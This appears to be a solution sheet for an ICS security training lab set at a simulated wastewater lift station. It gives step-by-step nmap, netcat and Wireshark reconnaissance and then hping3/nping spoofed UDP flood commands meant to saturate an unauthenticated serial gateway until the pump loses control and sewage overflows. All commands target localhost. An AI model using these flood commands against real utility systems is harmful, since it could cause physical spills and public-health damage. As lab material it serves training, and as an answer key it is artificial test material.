# Cedar Creek Lift Station 7 (Scenario 5): Solution Commands

**Facility:** Wastewater Lift Station (remote, unmanned)
**Protocol:** Serial-over-UDP gateway · Port 5025

> Solution commands for each attack phase.
> This scenario is a **denial of control**. The goal is to starve the
> station's comms until the pump loses control on its own.

---

## Real-world tooling & context

The workflow is **discover → weigh the target → deny it**. This is a network
availability attack, so the tools are recon + flooding utilities, not a
protocol client.

| Step | Tools shown here |
|------|-------------------|
| Port discovery | `nmap` (UDP sweep) |
| Banner grab | `netcat` (`nc -u`), any input at all works |
| Baseline traffic | Wireshark |
| Denial of service | `hping3` (Kali), `nping` (cross-platform fallback) |

**Why UDP.** The gateway is a stand-in for a legacy serial-to-Ethernet bridge
(Moxa NPort / Lantronix style). It has no authentication, no rate limiting,
and no source filtering; its only real constraint is the tiny bandwidth of
the serial line on the other side, which is exactly what a flood exhausts.

---

## Phase 1: Discover the Comms Gateway

**Objective:** Find the remote lift station's serial-to-Ethernet gateway and confirm it is a live, unauthenticated UDP service.

### Step 1: Sweep the SCADA host for open UDP services

```bash
# you don't know the port yet, so scan a range (UDP scans need root)
sudo nmap -sU -p 5020-5030 localhost
```

UDP 5025 comes back open, an unexpected service next to the known SCADA
ports. nmap can confirm it's open, but its `-sV` version detection only
recognizes protocols in its signature database, proprietary ICS protocols
like this one usually come back unidentified (`tcpwrapped` or `unknown`).
That's normal, not a failure: it just means the next step is a manual
banner grab.

### Step 2: Banner-grab it by hand, send it anything at all

```bash
# this device answers ANY input with no handshake and no credentials,
# that's the vulnerability. The content doesn't matter, try garbage:
echo "hello" | nc -u -w1 localhost 5025
head -c 20 /dev/urandom | nc -u -w1 localhost 5025
```

Both return the same identity banner: an NP-5150 serial-to-Ethernet gateway
(Modbus-RTU bridge) with `auth=NONE`, the single link the station's control
and telemetry ride on. It doesn't matter what you send, only that you can
reach it.

---

## Phase 2: Weigh the Target

**Objective:** Observe normal polling and confirm how little traffic this legacy gateway can actually handle.

### Step 1: Watch the live field polling on the wire

```bash
# capture the normal, low-rate polling to the gateway
sudo wireshark &
# Wireshark display filter (capture on the loopback interface):
udp.port == 5025
```

You'll see one small query/response pair about once a second, the
station's own field polling. That's the entire normal load. Compare it to
the gateway's capacity.

---

## Phase 3: Flood the Gateway, Denial of Control

**Objective:** Saturate the gateway with a UDP flood so the station goes blind, the pump loses control, and the wet well overflows.

### Step 1: Open the process views to watch the impact

```bash
# Keep the Control Room open in one tab (it will freeze / go COMMS LOST)
# and the Lab Monitor in another (it shows ground truth: the real overflow).
```

### Step 2: Launch the UDP flood

```bash
# hammer the gateway as fast as the NIC allows, with spoofed sources
sudo hping3 --udp -p 5025 --flood --rand-source localhost
```

Within seconds the NETWORK panel shows the gateway SATURATED and field
comms LOST. Watch the wet-well level climb past 90% to overflow.

### Alternative: flood with nping instead of hping3

```bash
# nping caps --rate at 999/s in some builds, and that's still 2.5x
# the gateway's ~400 pkt/s capacity, more than enough to saturate it
sudo nping --udp -p 5025 --rate 999 -c 0 localhost
```

Any high-rate UDP flooder works, the gateway has no rate limiting to stop
it. Use this if `hping3` isn't installed (e.g. testing on macOS instead of
Kali).

### Step 3: Stop the flood and watch it recover

```bash
# Ctrl-C the flood. The gateway drains, comms restore, and the PLC
# resumes pump control, but the sewage that already spilled is gone.
```